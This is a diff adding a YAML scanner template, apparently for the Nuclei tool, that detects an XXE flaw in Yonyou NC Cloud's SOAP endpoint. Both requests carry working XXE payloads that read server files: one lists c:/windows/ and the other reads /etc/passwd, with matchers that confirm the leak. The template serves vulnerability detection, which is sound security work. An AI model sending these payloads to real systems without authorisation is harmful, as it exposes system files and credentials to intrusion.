@@ -1,0 +1,47 @@
+id: yonyou_nc_cloud_xxe
+info:
+  name: Yonyou NC Cloud XXE Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Detects an XXE vulnerability in Yonyou NC Cloud SOAP endpoint, where arbitrary file reads from the server are possible.
+
+http:
+  - id: "1"
+    method: POST
+    path:
+      - "{{BaseURL}}/uapws/soapFormat.ajax"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      msg=<!DOCTYPE foo[<!ENTITY xxe1two SYSTEM "file:///c:/windows/"> ]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><soap:Fault><faultcode>soap:Server%26xxe1two%3b</faultcode></soap:Fault></soap:Body></soap:Envelope>%0a
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "soap:ServerADFS"
+          - "appcompat"
+          - "win.ini"
+          - "explorer.exe"
+        part: body
+      - type: status
+        status:
+          - 200
+
+  - id: "2"
+    method: POST
+    path:
+      - "{{BaseURL}}/uapws/soapFormat.ajax"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      msg=<!DOCTYPE foo[<!ENTITY xxe1two SYSTEM "file:////etc/passwd"> ]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><soap:Fault><faultcode>soap:Server%26xxe1two%3b</faultcode></soap:Fault></soap:Body></soap:Envelope>%0a
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "root:[^:]*:[0-9]*:[0-9]*:[^:]*"
+        part: body
+      - type: status
+        status:
+          - 200
